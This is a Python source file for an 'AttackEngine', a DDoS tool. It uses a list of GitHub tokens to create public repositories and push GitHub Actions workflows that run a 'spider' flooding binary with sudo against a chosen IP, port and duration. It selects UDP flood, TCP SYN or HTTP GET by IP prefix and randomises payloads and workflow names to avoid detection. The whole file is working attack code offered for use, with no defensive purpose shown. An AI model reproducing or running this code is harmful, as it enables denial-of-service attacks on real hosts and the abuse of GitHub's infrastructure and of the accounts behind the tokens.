import random
import string
import time
import threading
import requests
import socket
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from github import Github, GithubException

class AttackEngine:
    def __init__(self, tokens, max_workers=50):
        self.tokens = tokens
        self.max_workers = max_workers
        self.results = []
        self.lock = threading.Lock()
        
    def _random_payload(self, size=1024):
        """Generate random payload to avoid detection"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()
    
    def _get_method(self, ip):
        """Auto-select attack method based on IP"""
        if ip.startswith('91'):
            return "UDP_FLOOD"
        elif ip.startswith(('15', '96')):
            return "TCP_SYN"
        else:
            return "HTTP_GET"
    
    def _attack_single_token(self, token_data, ip, port, duration, method):
        """Attack using a single GitHub token"""
        try:
            g = Github(token_data['token'])
            user = g.get_user()
            repo_name = token_data.get('repo', f"spider-{random.randint(1000,9999)}")
            
            # Create repo if doesn't exist
            try:
                repo = user.get_repo(repo_name.split('/')[-1])
            except:
                repo = user.create_repo(repo_name.split('/')[-1], private=False)
                token_data['repo'] = f"{user.login}/{repo_name.split('/')[-1]}"
            
            # Generate workflow with random variations
            yml = f"""name: attack-{random.randint(1000,9999)}
on: [push]
jobs:
  run:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8]
    steps:
    - uses: actions/checkout@v3
    - run: |
        chmod +x spider
        sudo ./spider {ip} {port} {duration} {random.randint(200,500)}
"""
            # Upload workflow
            try:
                content = repo.get_contents(".github/workflows/main.yml")
                repo.update_file(".github/workflows/main.yml", f"Update {int(time.time())}", yml, content.sha)
            except:
                repo.create_file(".github/workflows/main.yml", f"Create {int(time.time())}", yml)
            
            # Trigger workflow
            time.sleep(1)
            return {
                "token": token_data['token'][:10] + "...",
                "username": user.login,
                "status": "SUCCESS",
                "repo": repo.full_name
            }
        except Exception as e:
            return {
                "token": token_data['token'][:10] + "...",
                "username": token_data.get('username', 'unknown'),
                "status": "FAILED",
                "error": str(e)[:100]
            }
    
    def launch_attack(self, ip, port, duration):
        """Launch parallel attack on all tokens"""
        method = self._get_method(ip)
        print(f"⚡ Launching {method} attack on {ip}:{port} for {duration}s using {len(self.tokens)} tokens")
        
        self.results = []
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for token in self.tokens:
                future = executor.submit(
                    self._attack_single_token, 
                    token, ip, port, duration, method
                )
                futures.append(future)
            
            for future in as_completed(futures):
                result = future.result()
                self.results.append(result)
                print(f"  → {result['username']}: {result['status']}")
        
        elapsed = time.time() - start_time
        
        # Count successes
        success = sum(1 for r in self.results if r['status'] == 'SUCCESS')
        
        return {
            "total": len(self.results),
            "success": success,
            "failed": len(self.results) - success,
            "elapsed": round(elapsed, 2),
            "method": method,
            "results": self.results
        }
    
    def stop_all(self):
        """Stop all running attacks (cancel workflows)"""
        stopped = 0
        for token in self.tokens:
            try:
                g = Github(token['token'])
                user = g.get_user()
                for status in ['queued', 'in_progress']:
                    try:
                        repo = user.get_repo(token.get('repo', '').split('/')[-1])
                        for workflow in repo.get_workflow_runs(status=status):
                            workflow.cancel()
                            stopped += 1
                    except:
                        pass
            except:
                pass
        return stopped
